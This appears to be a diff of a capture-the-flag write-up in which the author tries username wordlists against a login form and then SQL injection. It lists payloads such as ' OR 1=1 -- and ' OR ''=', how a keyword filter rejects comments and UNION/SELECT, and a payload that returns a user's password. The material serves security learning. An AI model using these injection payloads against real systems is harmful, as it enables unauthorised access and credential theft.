@@ -78,35 +78,93 @@ _**Word-lists to try out**_:
 2. `/usr/share/wordlists/seclists/Usernames/Names/malenames-usa-top1000.txt`&#x20;
 3. `/usr/share/wordlists/seclists/Usernames/Names/femalenames-usa-top1000.txt`
 
-I found the username: alice. However this wasn't the admin username.&#x20;
+I found the username: alice. However this wasn't the admin username. Probably a rookie mistake on my part for not realising sooner that an SQL injection is likely to be more feasible.&#x20;
 
 ### SQL Injection
 
 I noticed that the input form length is very long, and realized that it's highly unlikely that I would be able find the username with a simple brute-force. The following shows a bunch of input (first line) and output from the application (second line)
 
+**Possible SQL statements on the server side:**
+
 ```sql
-1)
-' OR 1=1
-"' LIMIT 30"
+SELECT * FROM users WHERE name='smokey';
+```
 
-2) 
-' OR 1=1;
-Pause with no response
+**Attempts with common SQL injection inputs:**
 
-2) 
-UNION 
-Ahh there is a word in there I don't like :(
+1. **Force the statement to resolve to true**
 
-3)
+Potentially tricking the database to return all the users
+
+```sql
+' OR 1=1 --
+```
+
+```sql
+SELECT * FROM users WHERE name='' OR 1=1--';
+```
+
+Reponse: _For strange reasons I can't explain, any input containing /\*, -- or, %0b is not allowed :)_
+
+This tells us that comment values are banned
+
+
+
+**Another attempt:**
+
+```sql
+' OR ''='
+```
+
+```sql
+SELECT * FROM users WHERE name='' OR ''='';
+```
+
+This seems to return a password value (that is returned from the _alice_ username).&#x20;
+
+
+
+2. UNION and SELECT statement
+
+The UNION and SELECT keywords (along with their lower capital variations) are all banned too
+
+```sql
+UNION
 SELECT
-Ahh there is a word in there I don't like :(
+union
+select
+```
 
-4)
---
-For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
+Reponse: _Ahh there is a word in there I don't like :(_
 
-5) 
-' LIMIT 30 OR '1=1;
-Error: near "LIMIT": syntax error
+<pre class="language-sql"><code class="lang-sql">-- 1)
+--INPUT: ' OR 1=1 
+-- Error: unrecognized token:  "' LIMIT 30" 
 
+--3) 
+--INPUT: ' OR 1=1;
+--Pause with no response
+
+--2) 
+--INPUT: 'UNION 
+<strong>--Ahh there is a word in there I don't like :(
+</strong>
+--3)
+--INPUT: 'SELECT
+--Ahh there is a word in there I don't like :(
+
+--4)
+<strong>--INPUT: '--
+</strong>--For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
+
+--5) 
+--INPUT: '' LIMIT 30 OR '1=1;
+--Error: near "LIMIT": syntax error
+
+</code></pre>
+
+
+
+```sql
+SELECT * FROM users WHERE name=''--';
 ```
